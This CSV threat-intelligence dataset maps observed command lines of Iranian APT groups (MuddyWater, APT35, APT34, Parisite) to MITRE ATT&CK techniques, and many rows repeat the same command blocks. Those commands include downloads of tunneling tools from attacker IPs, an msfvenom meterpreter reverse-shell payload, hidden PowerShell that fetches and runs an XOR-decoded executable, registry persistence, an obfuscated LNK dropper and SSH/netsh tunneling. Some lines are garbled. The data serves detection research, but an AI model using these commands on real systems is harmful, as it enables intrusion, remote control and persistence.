Threat Actor,Tool,Mitre Category,Mitre Technique ID,Mitre Technique Name,CLI
MuddyWater,wget,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,wget,execution,T1059.006,Python,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,wget,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,gunzip,command-and-control,T1105,Ingress Tool Transfer,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,gunzip,execution,T1059.006,Python,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,gunzip,execution,T1059.003,Windows Command Shell,"python3 Please_Run_Once.py
wget 45.86.230.20
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz tar -ZXVI Iгp_0.44.0_linux_amd64.tar.gz
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel 1.7.7_linux_amd64.gz
wget python2 wsc2.py
gunzip chisel 1.7.7_linux_amd64.gz
chmod a+x chisel 1.7.7_linux_amd64"
MuddyWater,wget,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
MuddyWater,wget,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
MuddyWater,gunzip,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
MuddyWater,gunzip,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
MuddyWater,MSFvenom,execution,T1059.003,Windows Command Shell,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
MuddyWater,MSFvenom,command-and-control,T1105,Ingress Tool Transfer,"wget https://github.com/ekzhang/bore/releases/download/v0.4.1/bore-v0.4.1-x86_64-unknown-linux-mus1.tar.gz
gunzip bore-v0.4.1-x86_64-unknown-linux-musl.tar.gz
msfvenom -p windows/x64/meterpreter_reverse_https 1host-194.61.121.86 1port-8443 -f aspx > 404.aspx"
APT35,Windows Service Configuration Tool,defense-evasion,T1036.004,Masquerade Task or Service,"sc create Microsoft Exchange Services Health binpath= C:\\ProgramData\\Microsoft\\DRMS\\Microsoft Exchange Services Health.exe start= auto 
sc start Microsoft Exchange Services Health
sc create Exchange Agent Diagnostic Services binpath= C:\\ProgramData\\Microsoft\\Diagnostic\\Exchange Agent Diagnostic Services.exe start= auto 
sc start Microsoft Exchange Services Health"
APT35,Windows Service Configuration Tool,persistence,T1543.003,Windows Service,"sc create Microsoft Exchange Services Health binpath= C:\\ProgramData\\Microsoft\\DRMS\\Microsoft Exchange Services Health.exe start= auto 
sc start Microsoft Exchange Services Health
sc create Exchange Agent Diagnostic Services binpath= C:\\ProgramData\\Microsoft\\Diagnostic\\Exchange Agent Diagnostic Services.exe start= auto 
sc start Microsoft Exchange Services Health"
APT35,WMIC,execution,T1047,Windows Management Instrumentation,wmic /node:127.0.0.1 process call create c:\\windows\\temp\\Certificates\\envisa.exe 88.80.148[.]162 -P 443 -C -R 127.0.0.1:40455:192.168.10.10:1433 -l <user> -pw <password>”
APT35,PowerShell,execution,T1059.001,PowerShell,"%WINDIR%\temp\Certificates\envisa.exe
%ALLUSERSPROFILE%\Microsoft\DRMS\JavaUpdateServices.exe
%ALLUSERSPROFILE%\Microsoft\Diagnostic\MicrosoftExchangeServicesLog.exe
%ALLUSERSPROFILE%\Microsoft\Diagnostic\MicrosoftExchangeDiagnosticServices.exe"
APT35,PowerShell,execution,T1059.001,PowerShell,"/c powershell -WindowStyle hidden  $path = '%TEMP%\s6b4.0.pdf'; $wc = New-Object System.Net.WebClient; $bytes = $wc.DownloadData('https://deersharpfork.info/dw85fgxtvzq/download/i/34624051816246d4a1a7f225d966d139/7e58169ee59d46e7a2be023e728c6205.jpg'); sc $path ([byte[]]($bytes)) -Encoding Byte; & %TEMP%\s6b4.0.pdf
/c powershell -WindowStyle hidden  $path = '%TEMP%\s6b4.1.exe'; $wc = New-Object System.Net.WebClient; $bytes = $wc.DownloadData('https://deersharpfork.info/dw85fgxtvzq/download/f/bb14611f7aae441fb78f2ca919b800b5/7e58169ee59d46e7a2be023e728c6205'); for($i = 0; $i -lt $bytes.count; $i++) {$bytes[$i] = $bytes[$i] -bxor 0x25 }; sc $path ([byte[]]($bytes)) -Encoding Byte; ^& %TEMP%\s6b4.1.exe;"
APT35,Reg,defense-evasion,T1112,Modify Registry,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
APT35,Reg,discovery,T1083,File and Directory Discovery,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
APT35,WMIC,defense-evasion,T1112,Modify Registry,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
APT35,WMIC,discovery,T1083,File and Directory Discovery,"{Cid : 29  Command : reg add 'hkcu\software\microsoft\windows NT\currentversion\winlogon' /v 'Shell' /d 'explorer.exe %LOCALAPPDATA%\SystemCall\syscall02.exe' -f  CommandType :Command}
{Cid : 30  Command : wmic logicaldisk get name  CommandType :Command}"
APT35,WMIC,discovery,T1069.002,Domain Groups,wmic computersystem get domain
APT34,PowerShell,execution,T1059.001,PowerShell,powershell.exe -File %APPDATA%\Local\Microsoft\InputPersonalization\TrainedDataStore.ps1
APT35,findstr,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,Console Windows Host,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,cd,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,mkdir,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,start,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,rm,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,copy,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,dir,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,Cmd,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
APT35,Regsvr32,,,,conhost --headless cmd /c FOR /F delims=s\ tokens=4 %f IN ('set^|findstr PSM')DO %f -w 1 $zf='osf.zip';$pd='Biography of Mr.leehu hacohn.pdf';$pdl='Biography of Mr.leehu hacohn.lnk';$E=$ENV:Temp;$F=$env:LocalAppData+'\PDFs';if(-not(Test-Path $pdl)){cd $E;$pdl=(dir -recurse *$pdl)[0].fullname;$pd=$E+'\'+[System.IO.Path]::GetFileNameWithoutExtension($pdl)+'.pdf'}$b=[IO.File]::ReadAllBytes($pdl);function f($ar$su){foreach($i in 0..($ar.Length-$su.Length)){$fo=$true;foreach($j in 0..($su.Length-1)){if($ar[$i+$j] -ne $su[$j]){$fo=$false;break;}}if($fo){return $i;}}return -1;}$i=f $b ([byte[]][char[]]'%PDF');$nb=$b[$i..$b.Length];$s=[System.IO.FileStream]::new($pd[System.IO.FileMode]::Create);$s.Write($nb0($nb.length));$s.close();start $pd;Remove-Item $pdl;mkdir $F -f;copy $pd $F\$zf;Expand-Archive $F\$zf $F\ -f;cd $F;Start-Sleep -Seconds 3;rm $zf;odbcconf /a `{regsvr $F\Wow `} ;
Parisite,ipconfig,command-and-control,T1090.001,Internal Proxy,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ipconfig,discovery,T1049,System Network Connections Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ipconfig,execution,T1059.001,PowerShell,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ipconfig,discovery,T1016,System Network Configuration Discovery,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
Parisite,ipconfig,lateral-movement,T1021.004,SSH,"TNC <DC-2 IP> -Port 135
ipconfig /all
.\SOCKSSrv.exe
netstat -nao|findstr 28443
ssh 104.238.191.185 -P 443
ssh 104.238.191.185 -p 443
Enter-PSSession -ComputerName <DC-2 IP>
TNC <DC-2 IP> -Port 389
netstat -nao|findstr 443
cmd
.\SOCKSSrv.exe
netsh i p a v listenport=443 connecthost=127.0.0.1 connectport=28443
netsh i p a v listenport=443 connectaddress=127.0.0.1 connectport=28443
netsh i p re all
.\443.exe"
